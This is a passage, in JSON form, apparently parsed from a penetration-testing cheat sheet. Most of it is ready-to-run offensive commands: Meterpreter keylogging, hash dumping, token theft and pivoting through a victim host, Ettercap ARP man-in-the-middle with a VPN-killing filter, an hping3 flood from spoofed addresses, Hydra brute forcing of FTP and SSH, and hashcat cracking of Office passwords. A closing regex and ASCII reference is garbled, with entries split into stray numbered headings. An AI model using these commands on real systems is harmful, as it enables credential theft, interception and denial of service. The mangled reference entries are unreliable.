      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "exploit",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Run the module",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Meterpreter Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "help",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List available commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sysinfo",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display system info",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ps",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List processes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "getpid",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List current PID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "upload <LOCAL_PATH> C:\\\\Program\\ Files\\\\test.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "Files\\\\test.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload a file to C:\\Program Files\\binary.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "Files\\binary.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "download <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Download file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg <COMMAND>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Interact with registry",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(reg by itself will list syntax)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rev2self",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Revert to original user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Drop to interactive shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "migrate <PID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Migrate to another PID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "background",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Background current session",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "keyscan_start",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start keylogger",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "keyscan_stop",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Stop keylogger",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "keyscan_dump",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Dump keylogger",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "execute –f cmd.exe –i",
      "level": 0,
      "metadata": {
        "file_paths": [
          "cmd.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Execute cmd.exe and interact",
      "level": 0,
      "metadata": {
        "file_paths": [
          "cmd.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "execute –f cmd.exe –i –H -t",
      "level": 0,
      "metadata": {
        "file_paths": [
          "cmd.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Execute cmd.exe as hidden process and with all tokens",
      "level": 0,
      "metadata": {
        "file_paths": [
          "cmd.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hashdump",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Dumps local hashes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "run <SCRIPT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Executes script (/scripts/meterpreter)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "portfwd add –L 127.0.0.1 –l 443 –r 3.3.3.3 –p 3389",
      "level": 0,
      "metadata": {
        "file_paths": [
          "127.0.0.1",
          "3.3.3.3"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create a rule to open port 443 on the attack machine and forward it through the session to target 3.3.3.3 on port 3389",
      "level": 0,
      "metadata": {
        "file_paths": [
          "3.3.3.3"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "portfwd delete –L 127.0.0.1 –l 443 –r 3.3.3.3 –p 3389",
      "level": 0,
      "metadata": {
        "file_paths": [
          "127.0.0.1",
          "3.3.3.3"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Delete the rule to open port 443 on the attack machine and forward it through the session to target 3.3.3.3 on port 3389",
      "level": 0,
      "metadata": {
        "file_paths": [
          "3.3.3.3"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "background",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Background session to interact with msfconsole",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "getuid",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List current session owner",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "steal_token <PID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Steal authentication token from process",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "screengrab",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run plugin to capture screenshot of user session",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Nmap Through Meterpreter Socks Proxy",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sessions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Take note of the Meterpreter ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "route add 3.3.3.0 255.255.255.0 <SESSION_ID>",
      "level": 0,
      "metadata": {
        "file_paths": [
          "3.3.3.0",
          "255.255.255.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add a route through the target host",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "use auxiliary/server/socks4a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Setup socks4a server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "run",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Run socks4a server (defaults to port 1080)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "socks4 127.0.0.1 1080",
      "level": 0,
      "metadata": {
        "file_paths": [
          "127.0.0.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Edit /etc/proxychains.conf and update with port 1080",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/etc/proxychains.conf"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "proxychains nmap –sT –Pn -n –p 80,135,445 3.3.3.3",
      "level": 0,
      "metadata": {
        "file_paths": [
          "3.3.3.3"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run Nmap scan against 3.3.3.3 targeting ports 80, 135, and 445. This scan will be tunneled through the Metasploit victim host",
      "level": 0,
      "metadata": {
        "file_paths": [
          "3.3.3.3"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ettercap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ettercap Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ettercap.exe –i <INTERFACE> –M arp –Tq –F file.ef <MACs>/<IPs>/<PORTs> <MACs>/<IPs>/<PORTs>",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ettercap.exe",
          "file.ef"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Man-in-the-Middle with filter",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<MAC>/<IP>/<PORTS> Example: //80,443 = any MACs, any IPs, ports 80 and 443",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ettercap –T –M arp –F filter.ef // //",
      "level": 0,
      "metadata": {
        "file_paths": [
          "filter.ef"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Man-in-the-Middle entire subnet with applied filter",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ettercap –TP rand_flood",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Switch flood",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ettercap Filter",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "etterfilter <ETTER_FILTER> –o out.ef",
      "level": 0,
      "metadata": {
        "file_paths": [
          "out.ef"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compile Ettercap filter",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "if (ip.proto == UDP && udp.dst == 500){",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "drop();",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "kill(); }",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "if (ip.src == ‘<ip>’){",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "if (tcp.dst == 80){",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "if (search(DATA.data, \"Accept-Encoding\")){",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "replace(\"Accept-Encoding\",\"Accept-Rubbish!\");",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "msg(\"Replaced Encoding\\n\");",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Sample filter - kills VPN traffic and decodes HTTP traffic",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hping3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hping3 <TARGETIP> --flood –-frag –-spoof <IP> --destport <PORT> --syn",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "DoS from spoofed IPs",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "arping",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "arping <IP_ADDRESS> -I <INTERFACE_NAME> -c <NUMBER_OF_ARPS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ARP scanner",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Password Cracking",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Hydra",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hydra -t 1 -l admin -P <PASSWORD_LIST_PATH> -v ftp://<IP_ADDRESS> ftp",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Brute force the username admin with the given password list",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hydra -v -u -L <USER_LIST_PATH> -P <PASSWORD_LIST_PATH> -t 1 ssh://<IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Brute force SSH with user and password lists against target IP address",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "John The Ripper",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "john --wordlist=<WORD_LIST_PATH> <HASH_LIST_FILE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Cracking with a wordlist",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "john --loopback <HASH_LIST_FILE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Attempt to crack hash file using previously cracked passwords",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "john --show <HASH_LIST_FILE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Show cracked passwords",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "john --incremental <HASH_LIST_FILE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Attempt to crack hash using incremental mode (May take a long time)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Note: If running on Kali check out /usr/share/wordlists for rockyou and other common password cracking wordlists.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Crack Excel Password Protected Document",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "python office2john.py <INPUT_PATH> > extractedHash.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "office2john.py",
          "extractedHash.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Run office2john.py against password protected Excel file to extract crackable hash from office document",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9400-MS Office 2007",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9500-MS Office 2010",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9600-MS Office 2013",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "25300-MS Office 2016 SheetProtection",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9700-MS Office <= 2003 $0/$1, MD5 + RC4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9710-MS Office <= 2003 $0/$1, MD5 + RC4, collider #1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9720-MS Office <= 2003 $0/$1, MD5 + RC4, collider #2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9810-MS Office <= 2003 $3, SHA1 + RC4, collider #1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9820-MS Office <= 2003 $3,SHA1+RC4, collider #2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9800-MS Office <= 2003 $3/$4, SHA1 + RC4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Determine office/hash version based on contents of extractedHash.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "extractedHash.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Listed in the output hash file from office2john... integer code on right goes into hashcat)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hashcat64 -a 0 -m <MODE> --username -o cracked.txt extractedHash.txt /usr/share/wordlists/rockyou.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "cracked.txt",
          "extractedHash.txt",
          "/usr/share/wordlists/rockyou.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run hashcat command to crack extracted and edited hash",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Programming",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ASCII & Regex",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Regex Expressions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "^",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start of string",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "*",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "or more",
      "level": 1,
      "metadata": {
        "number": "0"
      }
    },
    {
      "type": "paragraph",
      "content": "+",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "or more",
      "level": 1,
      "metadata": {
        "number": "1"
      }
    },
    {
      "type": "paragraph",
      "content": "?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "or 1",
      "level": 1,
      "metadata": {
        "number": "0"
      }
    },
    {
      "type": "paragraph",
      "content": ".",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Any char but \\n",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "{3}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Exactly 3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "{3,}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "or more",
      "level": 1,
      "metadata": {
        "number": "3"
      }
    },
    {
      "type": "code_block",
      "content": "{3,5}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "to 5",
      "level": 1,
      "metadata": {
        "number": "3"
      }
    },
    {
      "type": "code_block",
      "content": "{3|5}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "or 5",
      "level": 1,
      "metadata": {
        "number": "3"
      }
    },
    {
      "type": "paragraph",
      "content": "[345]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "or 4 or 5",
      "level": 1,
      "metadata": {
        "number": "3"
      }
    },
    {
      "type": "paragraph",
      "content": "[^34]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Not 3 or 4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[a-z]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Lowercase a-z",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[A-Z]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Uppercase A-Z",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[0-9]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Digit 0-9",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\\d",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Digit",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\\D",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Not digit",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\\w",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "A-Z,a-z,0-9",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\\W",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Not A-Z,a-z,0-9",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\\s",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "White Space (\\t\\r\\n\\f)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\\S",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Not (\\t\\r\\n\\f)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg[ex]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\"rege\" or \"regx\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "regex?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\"rege\" or \"regex\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "regex*",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\"rege\" w/ 0 or more x",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "regex+",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\"rege\" w/ 1 or more x",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[Rr]egex",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\"Regex\" or \"regex\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "\\d{3}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Exactly 3 digits",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "\\d{3,}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "or more digits",
      "level": 1,
      "metadata": {
        "number": "3"
      }
    },
    {
      "type": "paragraph",
      "content": "[aeiou]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Any 1 vowel",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(0[3-9]|1[0-9]|2[0-5])",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Numbers 03-25",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ASCII Table",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Hex",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ASCII",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x00",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NUL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x08",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "BS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x09",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TAB",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x0a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "LF",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x0d",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "CR",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x1b",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ESC",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x20",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SPC",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x21",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "!",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x22",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
